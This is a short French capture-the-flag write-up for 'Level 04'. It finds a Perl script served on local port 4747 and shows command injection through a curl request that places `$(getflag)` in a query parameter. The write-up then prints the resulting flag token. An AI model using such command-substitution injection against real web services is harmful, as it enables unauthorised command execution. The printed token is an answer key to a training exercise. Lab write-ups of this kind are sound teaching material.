
## **Level 04 :**

On a un script perl, qui est en fait lancé sur le port 4747 de la machine. (`ss -tulwn | grep 4747`)

On voit qu'on peut paser un param a ce script. On va utiliser curl, et passer un param:

`curl 'localhost:4747?x=coucou'`

Le programme nous repond "coucou".

On sait qu'on peut utiliser la substitution de commande (`$(command)`) pour lancer un commande et capturer sa sortie.

Essayons donc:

`curl 'localhost:4747?x=$(getflag)'` ... le script a ete lancé par un user ayant les droits:

> Token: **ne2searoevaevoem4ov4ar8ap**